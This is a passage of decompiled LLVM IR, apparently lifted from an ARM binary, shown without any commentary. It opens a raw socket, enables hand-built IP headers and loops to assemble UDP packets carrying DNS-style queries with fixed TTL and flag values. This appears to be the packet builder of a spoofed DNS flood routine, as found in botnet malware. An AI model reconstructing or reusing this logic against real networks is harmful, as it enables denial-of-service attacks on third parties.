  store i1 %v7_c334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c334, label %dec_label_pc_c7d0, label %dec_label_pc_c33c

dec_label_pc_c33c:                                ; preds = %dec_label_pc_c2e0
  %v0_c33c = load i32, i32* @r5, align 4
  %v9_c33c = icmp eq i32 %v0_c33c, %v0_c334
  store i1 %v9_c33c, i1* %cpsr_z.global-to-local, align 1
  %v7_c340 = icmp sgt i32 %v0_c33c, %v0_c334
  br i1 %v7_c340, label %dec_label_pc_c344, label %dec_label_pc_c7d0

dec_label_pc_c344:                                ; preds = %dec_label_pc_c33c
  %v0_c344 = load i32, i32* @sl, align 4
  %v2_c344 = add i32 %v0_c344, %v0_c334
  store i32 %v2_c344, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c370 = add i32 %v0_c33c, -1
  br label %dec_label_pc_c368

dec_label_pc_c354:                                ; preds = %dec_label_pc_c390, %bb103
  %v9_c354 = icmp eq i32 %v1_c370, %v0_c35c
  store i1 %v9_c354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c354, label %dec_label_pc_c39c, label %dec_label_pc_c35c

dec_label_pc_c35c:                                ; preds = %dec_label_pc_c380, %dec_label_pc_c354, %bb
  %v0_c38c29 = phi i32 [ %v0_c38c, %dec_label_pc_c380 ], [ %v0_c38c30, %dec_label_pc_c354 ], [ %v0_c38c, %bb ]
  %v0_c36c25 = phi i32 [ 0, %dec_label_pc_c380 ], [ %v0_c36c26, %dec_label_pc_c354 ], [ 0, %bb ]
  %v1_c35c = add i32 %v0_c35c, 1
  %v9_c360 = icmp eq i32 %v1_c35c, %v0_c33c
  store i1 %v9_c360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c360, label %dec_label_pc_c7d0, label %dec_label_pc_c368

dec_label_pc_c368:                                ; preds = %dec_label_pc_c35c, %dec_label_pc_c344
  %v0_c35c = phi i32 [ %v1_c35c, %dec_label_pc_c35c ], [ %v0_c334, %dec_label_pc_c344 ]
  %v0_c38c = phi i32 [ %v0_c38c29, %dec_label_pc_c35c ], [ 0, %dec_label_pc_c344 ]
  %v0_c36c = phi i32 [ %v0_c36c25, %dec_label_pc_c35c ], [ 0, %dec_label_pc_c344 ]
  %v0_c374 = phi i32 [ %v1_c374, %dec_label_pc_c35c ], [ %v2_c344, %dec_label_pc_c344 ]
  %v1_c368 = inttoptr i32 %v0_c374 to i8*
  %v2_c368 = load i8, i8* %v1_c368, align 1
  %v3_c368 = zext i8 %v2_c368 to i32
  store i32 %v3_c368, i32* %r3.global-to-local, align 4
  %v2_c36c = icmp eq i32 %v0_c36c, 0
  store i1 %v2_c36c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c370, i32* %r0.global-to-local, align 4
  %v1_c374 = add i32 %v0_c374, 1
  store i32 %v1_c374, i32* %r2.global-to-local, align 4
  %v1_c378 = add nsw i32 %v3_c368, -48
  store i32 %v1_c378, i32* %r1.global-to-local, align 4
  br i1 %v2_c36c, label %dec_label_pc_c380, label %dec_label_pc_c390

dec_label_pc_c380:                                ; preds = %dec_label_pc_c368
  %v7_c380 = icmp eq i8 %v2_c368, 9
  store i1 %v7_c380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c380, label %dec_label_pc_c35c, label %bb

bb:                                               ; preds = %dec_label_pc_c380
  %v8_c384 = icmp eq i8 %v2_c368, 32
  store i1 %v8_c384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c384, label %dec_label_pc_c35c, label %dec_label_pc_c38c

dec_label_pc_c38c:                                ; preds = %bb
  %v1_c38c = add i32 %v0_c38c, 1
  store i32 %v1_c38c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c390

dec_label_pc_c390:                                ; preds = %dec_label_pc_c368, %dec_label_pc_c38c
  %v0_c38c30 = phi i32 [ %v0_c38c, %dec_label_pc_c368 ], [ %v1_c38c, %dec_label_pc_c38c ]
  %v0_c36c26 = phi i32 [ %v0_c36c, %dec_label_pc_c368 ], [ %v1_c38c, %dec_label_pc_c38c ]
  %v7_c390 = icmp eq i8 %v2_c368, 46
  store i1 %v7_c390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c390, label %dec_label_pc_c354, label %bb103

bb103:                                            ; preds = %dec_label_pc_c390
  %v8_c394 = icmp eq i32 %v1_c378, 9
  store i1 %v8_c394, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_c378, 10
  br i1 %tmp, label %dec_label_pc_c354, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c354, %bb103
  %v0_c35c.lcssa = phi i32 [ %v1_c370, %dec_label_pc_c354 ], [ %v0_c35c, %bb103 ]
  %v2_c3a0 = sub i32 %v0_c35c.lcssa, %v0_c334
  store i32 %v2_c3a0, i32* @r4, align 4
  %v2_c3a4 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_c344, i32* %r1.global-to-local, align 4
  store i32 %v2_c3a4, i32* %r0.global-to-local, align 4
  store i32 %v2_c3a0, i32* %r2.global-to-local, align 4
  %v3_c3b4 = call i32 @function_10388(i32 %v2_c3a4, i32 %v2_c344, i32 %v2_c3a0)
  %v2_c3b8 = ptrtoint i32* %stack_var_-40 to i32
  %v1_c3bc = load i32, i32* @r4, align 4
  %v2_c3bc = add i32 %v1_c3bc, %v2_c3b8
  store i32 %v2_c3bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3a4, i32* @r0, align 4
  %v3_c3c8 = add i32 %v2_c3bc, -36
  %v4_c3c8 = inttoptr i32 %v3_c3c8 to i8*
  store i8 0, i8* %v4_c3c8, align 1
  %v1_c3cc = call i32 @function_11334(i32 %v2_c3a4)
  store i32 %v1_c3cc, i32* %r0.global-to-local, align 4
  store i32 %v1_c3cc, i32* @fp, align 4
  br label %dec_label_pc_c3d4

dec_label_pc_c3d49:                               ; preds = %dec_label_pc_c7d0
  unreachable

dec_label_pc_c3d4:                                ; preds = %dec_label_pc_c838, %dec_label_pc_c82c, %dec_label_pc_c81c, %dec_label_pc_c80c, %dec_label_pc_c39c
  %v1_c80849 = phi i32 [ %v1_c7d4, %dec_label_pc_c838 ], [ %v1_c7d4, %dec_label_pc_c82c ], [ %v1_c7d4, %dec_label_pc_c81c ], [ %v1_c7d4, %dec_label_pc_c80c ], [ %v1_c3cc, %dec_label_pc_c39c ]
  %v0_c3d4 = load i32, i32* @r7, align 4
  %v2_c3d4 = icmp eq i32 %v0_c3d4, 0
  store i1 %v2_c3d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c3d4, label %dec_label_pc_c7fc, label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %dec_label_pc_c3d4
  store i32 %v0_c3d4, i32* %r0.global-to-local, align 4
  %v1_c3e0 = inttoptr i32 %v0_c3d4 to i8*
  %v2_c3e0 = call i32 @function_10318(i8* %v1_c3e0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_c3e0, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c3f4 = call i32 @function_115e4(i32 2, i32 3, i32 17)
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v7_c3f8 = icmp eq i32 %v3_c3f4, -1
  store i1 %v7_c3f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3f8, label %dec_label_pc_c7fc, label %dec_label_pc_c404

dec_label_pc_c404:                                ; preds = %dec_label_pc_c3dc
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c40c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c40c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c420 = call i32 @function_115a0(i32 %v3_c3f4, i32 0, i32 3, i32 %v6_c40c, i32 4)
  store i32 %v5_c420, i32* %r0.global-to-local, align 4
  %v7_c424 = icmp eq i32 %v5_c420, -1
  store i1 %v7_c424, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c424, label %dec_label_pc_c7f4, label %dec_label_pc_c42c

dec_label_pc_c42c:                                ; preds = %dec_label_pc_c404
  %v0_c434 = load i32, i32* %sb.global-to-local, align 4
  %v1_c434 = urem i32 %v0_c434, 256
  store i32 %v1_c434, i32* %sb.global-to-local, align 4
  %v3_c43c = mul i32 %v6_c244, 65536
  store i32 %v3_c43c, i32* %r3.global-to-local, align 4
  %v5_c448 = trunc i32 %v0_c434 to i8
  %v0_c44c = load i32, i32* @r8, align 4
  %v2_c44c = icmp eq i32 %v0_c44c, 0
  store i1 %v2_c44c, i1* %cpsr_z.global-to-local, align 1
  %v3_c450 = urem i32 %v7_c1e8, 65536
  store i32 %v3_c450, i32* %r0.global-to-local, align 4
  %v3_c458 = urem i32 %v6_c244, 65536
  store i32 %v3_c458, i32* %r2.global-to-local, align 4
  %v3_c45c = mul i32 %v6_c25c, 65536
  %v3_c460 = mul i32 %v6_c278, 65536
  store i32 %v3_c460, i32* %ip.global-to-local, align 4
  br i1 %v2_c44c, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_c42c
  %v5_c468 = sext i8 %v5_c448 to i32
  store i32 %v5_c468, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_c42c, %bb104
  %v2_c494 = phi i32 [ %v3_c458, %dec_label_pc_c42c ], [ %v5_c468, %bb104 ]
  %v3_c474 = urem i32 %v6_c25c, 65536
  store i32 %v3_c474, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_c47c = urem i32 %v6_c278, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_c494 = load i32, i32* @r6, align 4
  br i1 %v2_c44c, label %.dec_label_pc_c67c.preheader_crit_edge, label %dec_label_pc_c49c

.dec_label_pc_c67c.preheader_crit_edge:           ; preds = %bb105
  %v3_c494 = add i32 %v1_c494, %v2_c494
  store i32 %v3_c494, i32* @r7, align 4
  %.pre = sext i8 %v5_c448 to i32
  br label %dec_label_pc_c67c.preheader

dec_label_pc_c49c:                                ; preds = %bb105
  %v2_c49c = add i32 %v1_c494, %v1_c434
  %v3_c4a0 = mul i32 %v2_c49c, 65536
  %v1_c4a8 = add i32 %v3_c4a0, 1769472
  %v1_c4ac = add i32 %v3_c4a0, 3080192
  %tmp106 = udiv i32 %v1_c4ac, 256
  %v3_c4c0 = and i32 %tmp106, 65280
  %v4_c4d0 = udiv i32 %v1_c4ac, 16777216
  %v5_c4d0 = or i32 %v3_c4c0, %v4_c4d0
  store i32 %v5_c4d0, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_c244 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_c1e8, 256
  %v3_c4e4 = and i32 %tmp107, 65280
  store i32 %v3_c4e4, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_c1e8, 256
  %v4_c4e8 = urem i32 %tmp108, 256
  %v5_c4e8 = or i32 %v4_c4e8, %v3_c4e4
  store i32 %v5_c4e8, i32* @sb, align 4
  store i32 %v3_c460, i32* %r2.global-to-local, align 4
  store i32 %v3_c45c, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_c25c, 256
  %v3_c4fc = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_c278, 256
  %v3_c500 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_c4a8, 256
  %v3_c504 = and i32 %tmp111, 65280
  store i32 %v3_c504, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_c25c, 256
  %v4_c508 = urem i32 %tmp112, 256
  %v5_c508 = or i32 %v4_c508, %v3_c4fc
  store i32 %v5_c508, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_c278, 256
  %v4_c50c = urem i32 %tmp113, 256
  %v5_c50c = or i32 %v4_c50c, %v3_c500
  store i32 %v5_c50c, i32* @r4, align 4
  %v1_c510 = add i32 %v1_c494, 1
  store i32 %v1_c510, i32* %r3.global-to-local, align 4
  %v4_c514 = udiv i32 %v1_c4a8, 16777216
  %v5_c514 = or i32 %v4_c514, %tmp111
  store i32 0, i32* @r5, align 4
  %v4_c598 = sext i8 %v5_c448 to i32
  %sext = mul nuw i32 %v5_c508, 65536
  %v7_c5ac = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_c50c, 65536
  %v4_c5d4 = sdiv i32 %sext8, 65536
  %v1_c574 = trunc i32 %v5_c1e8 to i8
  %extract.t = trunc i32 %v5_c220 to i8
  %v1_c59c = add nsw i32 %v4_c598, 41
  %sext120 = mul i32 %v5_c514, 65536
  %v3_c5ac = sdiv i32 %sext120, 65536
  br label %dec_label_pc_c52c

dec_label_pc_c52c:                                ; preds = %dec_label_pc_c64c, %dec_label_pc_c49c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_c534 = call i32 @function_1214c(i32 600, i32 1)
  store i32 %v2_c534, i32* %r0.global-to-local, align 4
  store i32 %v2_c1ac, i32* %ip.global-to-local, align 4
  %v3_c53c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c53c, i32* %r3.global-to-local, align 4
  %v2_c540 = load i32, i32* @r5, align 4
  %v5_c540 = mul i32 %v2_c540, 4
  %v6_c540 = add i32 %v5_c540, %v2_c1ac
  %v7_c540 = inttoptr i32 %v6_c540 to i32*
  store i32 %v2_c534, i32* %v7_c540, align 4
  %v0_c544 = load i32, i32* %ip.global-to-local, align 4
  %v1_c544 = load i32, i32* %r3.global-to-local, align 4
  %v4_c544 = mul i32 %v1_c544, 4
  %v5_c544 = add i32 %v4_c544, %v0_c544
  %v6_c544 = inttoptr i32 %v5_c544 to i32*
  %v7_c544 = load i32, i32* %v6_c544, align 4
  store i32 %v7_c544, i32* %r1.global-to-local, align 4
  %v1_c548 = inttoptr i32 %v7_c544 to i8*
  %v2_c548 = load i8, i8* %v1_c548, align 1
  %tmp127 = urem i8 %v2_c548, 16
  %v1_c54c = zext i8 %tmp127 to i32
  %v1_c550 = or i32 %v1_c54c, 64
  store i32 %v1_c550, i32* %r2.global-to-local, align 4
  %v1_c554 = trunc i32 %v1_c550 to i8
  store i8 %v1_c554, i8* %v1_c548, align 1
  %v0_c558 = load i32, i32* %r1.global-to-local, align 4
  %v1_c558 = inttoptr i32 %v0_c558 to i8*
  %v2_c558 = load i8, i8* %v1_c558, align 1
  %v3_c558 = zext i8 %v2_c558 to i32
  %v1_c55c = and i32 %v3_c558, 240
  %v1_c560 = or i32 %v1_c55c, 5
  store i32 %v1_c560, i32* %r3.global-to-local, align 4
  store i32 %v1_c22c, i32* %lr.global-to-local, align 4
  %v1_c568 = trunc i32 %v1_c560 to i8
  store i8 %v1_c568, i8* %v1_c558, align 1
  store i32 %v5_c1e8, i32* %r0.global-to-local, align 4
  %v0_c570 = load i32, i32* %lr.global-to-local, align 4
  %v2_c570 = icmp eq i32 %v0_c570, 0
  store i1 %v2_c570, i1* %cpsr_z.global-to-local, align 1
  %v2_c574 = load i32, i32* %r1.global-to-local, align 4
  %v3_c574 = add i32 %v2_c574, 1
  %v4_c574 = inttoptr i32 %v3_c574 to i8*
  store i8 %v1_c574, i8* %v4_c574, align 1
  store i32 %v5_c220, i32* %r2.global-to-local, align 4
  %v0_c57c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c57c, label %.thread11, label %bb114

bb114:                                            ; preds = %dec_label_pc_c52c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c580 = load i32, i32* %r1.global-to-local, align 4
  %v4_c580 = add i32 %v3_c580, 6
  %v5_c580 = inttoptr i32 %v4_c580 to i16*
  store i16 64, i16* %v5_c580, align 2
  %v0_c588.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_c588.pre to i8
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_c52c, %bb114
  %v0_c588.off0 = phi i8 [ %extract.t, %dec_label_pc_c52c ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_c588 = load i32, i32* %r1.global-to-local, align 4
  %v3_c588 = add i32 %v2_c588, 8
  %v4_c588 = inttoptr i32 %v3_c588 to i8*
  store i8 %v0_c588.off0, i8* %v4_c588, align 1
  %v0_c58c = load i32, i32* %r3.global-to-local, align 4
  %v1_c58c = trunc i32 %v0_c58c to i8
  %v2_c58c = load i32, i32* %r1.global-to-local, align 4
  %v3_c58c = add i32 %v2_c58c, 9
  %v4_c58c = inttoptr i32 %v3_c58c to i8*
  store i8 %v1_c58c, i8* %v4_c58c, align 1
  %v2_c594 = load i32, i32* @global_var_20a4c.46, align 4
  %v0_c59c = load i32, i32* %r1.global-to-local, align 4
  %v2_c5a0 = add i32 %v1_c59c, %v0_c59c
  store i32 %v2_c5a0, i32* @r4, align 4
  %v2_c5a4 = add i32 %v0_c59c, 12
  %v3_c5a4 = inttoptr i32 %v2_c5a4 to i32*
  store i32 %v2_c594, i32* %v3_c5a4, align 4
  store i32 %v3_c5ac, i32* %r2.global-to-local, align 4
  store i32 %v7_c5ac, i32* %r3.global-to-local, align 4
  %v0_c5b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5b0 = add i32 %v0_c5b0, 20
  store i32 %v1_c5b0, i32* %ip.global-to-local, align 4
  %v0_c5b4 = load i32, i32* @sl, align 4
  %v1_c5b4 = trunc i32 %v0_c5b4 to i16
  %v3_c5b4 = add i32 %v0_c5b0, 2
  %v4_c5b4 = inttoptr i32 %v3_c5b4 to i16*
  store i16 %v1_c5b4, i16* %v4_c5b4, align 2
  %v0_c5b8 = load i32, i32* @sb, align 4
  %v1_c5b8 = trunc i32 %v0_c5b8 to i16
  %v2_c5b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 4
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i16*
  store i16 %v1_c5b8, i16* %v4_c5b8, align 2
  %v0_c5bc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5bc = trunc i32 %v0_c5bc to i16
  %v2_c5bc = load i32, i32* %ip.global-to-local, align 4
  %v3_c5bc = add i32 %v2_c5bc, 4
  %v4_c5bc = inttoptr i32 %v3_c5bc to i16*
  store i16 %v1_c5bc, i16* %v4_c5bc, align 2
  %v0_c5c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5c0 = trunc i32 %v0_c5c0 to i16
  %v2_c5c0 = load i32, i32* %ip.global-to-local, align 4
  %v3_c5c0 = add i32 %v2_c5c0, 2
  %v4_c5c0 = inttoptr i32 %v3_c5c0 to i16*
  store i16 %v1_c5c0, i16* %v4_c5c0, align 2
  %v2_c5c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5c8 = add i32 %v2_c5c8, 20
  %v4_c5c8 = inttoptr i32 %v3_c5c8 to i16*
  store i16 %rev, i16* %v4_c5c8, align 2
  store i32 %v4_c598, i32* %ip.global-to-local, align 4
  %v0_c5d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5d0 = add i32 %v0_c5d0, 28
  store i32 %v1_c5d0, i32* %r0.global-to-local, align 4
  store i32 %v4_c5d4, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_c5e0 = add i32 %v0_c5d0, 30
  %v4_c5e0 = inttoptr i32 %v3_c5e0 to i16*
  store i16 1, i16* %v4_c5e0, align 2
  %v0_c5e4 = load i32, i32* @lr, align 4
  %v1_c5e4 = trunc i32 %v0_c5e4 to i16
  %v2_c5e4 = load i32, i32* %r0.global-to-local, align 4
  %v3_c5e4 = add i32 %v2_c5e4, 4
  %v4_c5e4 = inttoptr i32 %v3_c5e4 to i16*
  store i16 %v1_c5e4, i16* %v4_c5e4, align 2
  %v0_c5e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_c5e8 = trunc i32 %v0_c5e8 to i8
  %v2_c5e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5e8 = add i32 %v2_c5e8, 40
  %v4_c5e8 = inttoptr i32 %v3_c5e8 to i8*
  store i8 %v1_c5e8, i8* %v4_c5e8, align 1
  %v0_c5ec = load i32, i32* @fp, align 4
  %v1_c5ec = load i32, i32* %r1.global-to-local, align 4
  %v2_c5ec = add i32 %v1_c5ec, 16
  %v3_c5ec = inttoptr i32 %v2_c5ec to i32*
  store i32 %v0_c5ec, i32* %v3_c5ec, align 4
  %v0_c5f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5f0 = trunc i32 %v0_c5f0 to i16
  %v2_c5f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5f0 = add i32 %v2_c5f0, 28
  %v4_c5f0 = inttoptr i32 %v3_c5f0 to i16*
  store i16 %v1_c5f0, i16* %v4_c5f0, align 2
  %v0_c5f4 = load i32, i32* @r4, align 4
  %v1_c5f4 = add i32 %v0_c5f4, 1
  store i32 %v1_c5f4, i32* %r0.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @r7, align 4
  store i32 %v0_c5f8, i32* %r1.global-to-local, align 4
  store i32 %v1_c510, i32* %r2.global-to-local, align 4
  %v3_c600 = call i32 @function_10388(i32 %v1_c5f4, i32 %v0_c5f8, i32 %v1_c510)
  store i32 %v3_c600, i32* %r0.global-to-local, align 4
  %v0_c604 = load i32, i32* @r6, align 4
  %v2_c604 = icmp eq i32 %v0_c604, 0
  store i1 %v2_c604, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_c604, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_c614

bb116:                                            ; preds = %.thread11
  %v5_c608 = load i32, i32* @r4, align 4
  store i32 %v5_c608, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c64c

dec_label_pc_c614:                                ; preds = %.thread11
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_c618 = load i32, i32* @r4, align 4
  store i32 %v0_c618, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c620

dec_label_pc_c620:                                ; preds = %.thread18, %dec_label_pc_c614
  %v0_c62c = phi i32 [ %storemerge, %.thread18 ], [ 0, %dec_label_pc_c614 ]
  %v0_c630 = phi i32 [ %v0_c644, %.thread18 ], [ 0, %dec_label_pc_c614 ]
  %v1_c620 = load i32, i32* @r7, align 4
  %v2_c620 = add i32 %v1_c620, %v0_c630
  %v3_c620 = inttoptr i32 %v2_c620 to i8*
  %v4_c620 = load i8, i8* %v3_c620, align 1
  %v6_c620 = zext i8 %v4_c620 to i32
  store i32 %v6_c620, i32* %r3.global-to-local, align 4
  %v7_c624 = icmp eq i8 %v4_c620, 46
  store i1 %v7_c624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c624, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_c620
  %v1_c62c14 = add nsw i32 %v0_c62c, 1
  store i32 %v1_c62c14, i32* %r2.global-to-local, align 4
  %v1_c63016 = add i32 %v0_c630, 1
  store i32 %v1_c63016, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_c620
  %v2_c628 = load i32, i32* @r4, align 4
  %v3_c628 = add i32 %v2_c628, %v0_c630
  store i32 %v3_c628, i32* %r3.global-to-local, align 4
  %v1_c62c = add nsw i32 %v0_c62c, 1
  store i32 %v1_c62c, i32* %r2.global-to-local, align 4
  %v1_c630 = add i32 %v0_c630, 1
  store i32 %v1_c630, i32* %r1.global-to-local, align 4
  %v2_c634 = trunc i32 %v0_c62c to i8
  %v3_c634 = load i32, i32* %r0.global-to-local, align 4
  %v4_c634 = inttoptr i32 %v3_c634 to i8*
  store i8 %v2_c634, i8* %v4_c634, align 1
  %v0_c638.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c638.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_c638.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_c638 = phi i32 [ %v1_c638.pre, %bb117.bb118_crit_edge ], [ %v1_c62c14, %.thread59 ]
  %v2_c638 = urem i32 %v1_c638, 256
  br label %.thread18

bb119:                                            ; preds = %bb117
  %v1_c63c = load i32, i32* %r3.global-to-local, align 4
  %v2_c63c = add i32 %v1_c63c, 1
  store i32 %v2_c63c, i32* %r0.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_c638, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_c644 = load i32, i32* %r1.global-to-local, align 4
  %v1_c644 = load i32, i32* @r6, align 4
  %v9_c644 = icmp eq i32 %v0_c644, %v1_c644
  store i1 %v9_c644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c644, label %dec_label_pc_c64c.loopexit, label %dec_label_pc_c620

dec_label_pc_c64c.loopexit:                       ; preds = %.thread18
  %v2_c64c.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_c64c

dec_label_pc_c64c:                                ; preds = %bb116, %dec_label_pc_c64c.loopexit
  %v0_c64c.off0 = phi i8 [ %extract.t126, %dec_label_pc_c64c.loopexit ], [ 0, %bb116 ]
  %v2_c64c = phi i32 [ %v2_c64c.pre, %dec_label_pc_c64c.loopexit ], [ %v5_c608, %bb116 ]
  %v3_c64c = inttoptr i32 %v2_c64c to i8*
  store i8 %v0_c64c.off0, i8* %v3_c64c, align 1
  %v3_c650 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = add i32 %v3_c650, 1
  store i32 %v1_c654, i32* @r5, align 4
  %v0_c658 = load i32, i32* @r4, align 4
  %v1_c658 = load i32, i32* @r6, align 4
  %v2_c658 = add i32 %v1_c658, %v0_c658
  store i32 %v2_c658, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_c660 = load i32, i32* @r8, align 4
  %v9_c660 = icmp eq i32 %v0_c660, %v1_c654
  store i1 %v9_c660, i1* %cpsr_z.global-to-local, align 1
  %v3_c664 = add i32 %v2_c658, 4
  %v4_c664 = inttoptr i32 %v3_c664 to i16*
  store i16 256, i16* %v4_c664, align 2
  %v0_c668 = load i32, i32* @lr, align 4
  %v1_c668 = trunc i32 %v0_c668 to i16
  %v2_c668 = load i32, i32* %r2.global-to-local, align 4
  %v3_c668 = add i32 %v2_c668, 2
  %v4_c668 = inttoptr i32 %v3_c668 to i16*
  store i16 %v1_c668, i16* %v4_c668, align 2
  %v0_c66c = load i32, i32* @r5, align 4
  store i32 %v0_c66c, i32* %stack_var_-44, align 4
  %v8_c670 = icmp sgt i32 %v0_c660, %v1_c654
  br i1 %v8_c670, label %dec_label_pc_c52c, label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c64c
  store i32 %v4_c598, i32* %r0.global-to-local, align 4
  %v0_c678 = load i32, i32* @r6, align 4
  %v2_c678 = add i32 %v0_c678, %v4_c598
  store i32 %v2_c678, i32* @r7, align 4
  %v0_c680.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_c67c.preheader

dec_label_pc_c67c.preheader:                      ; preds = %.dec_label_pc_c67c.preheader_crit_edge, %dec_label_pc_c674
  %v4_c6e0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c67c.preheader_crit_edge ], [ %v4_c598, %dec_label_pc_c674 ]
  %v0_c680.pre = phi i32 [ 0, %.dec_label_pc_c67c.preheader_crit_edge ], [ %v0_c680.pre.pre, %dec_label_pc_c674 ]
  %v3_c6ac = icmp eq i32 %v3_c450, 65535
  %v3_c6bc = icmp eq i32 %v3_c458, 65535
  br label %dec_label_pc_c67c

dec_label_pc_c67c:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c774, %dec_label_pc_c67c.preheader
  %v0_c680 = phi i32 [ %v0_c680.pre, %dec_label_pc_c67c.preheader ], [ 0, %dec_label_pc_c774 ], [ 0, %dec_label_pc_c67c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c680 = icmp eq i32 %v0_c680, 0
  store i1 %v2_c680, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c680, label %dec_label_pc_c67c, label %dec_label_pc_c68c

dec_label_pc_c68c:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c774
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c690 = load i32, i32* @r7, align 4
  %v1_c690 = add i32 %v0_c690, 27
  store i32 %v1_c690, i32* @sb, align 4
  %v1_c694 = add i32 %v0_c690, 47
  store i32 %v1_c694, i32* @sl, align 4
  br label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c6dc, %dec_label_pc_c68c
  %v1_c6a4 = phi i32 [ %v1_c764, %dec_label_pc_c6dc ], [ 0, %dec_label_pc_c68c ]
  store i32 %v2_c1ac, i32* %r3.global-to-local, align 4
  store i32 %v3_c450, i32* %ip.global-to-local, align 4
  %v4_c6a4 = mul i32 %v1_c6a4, 4
  %v5_c6a4 = add i32 %v4_c6a4, %v2_c1ac
  %v6_c6a4 = inttoptr i32 %v5_c6a4 to i32*
  %v7_c6a4 = load i32, i32* %v6_c6a4, align 4
  store i32 %v7_c6a4, i32* @r4, align 4
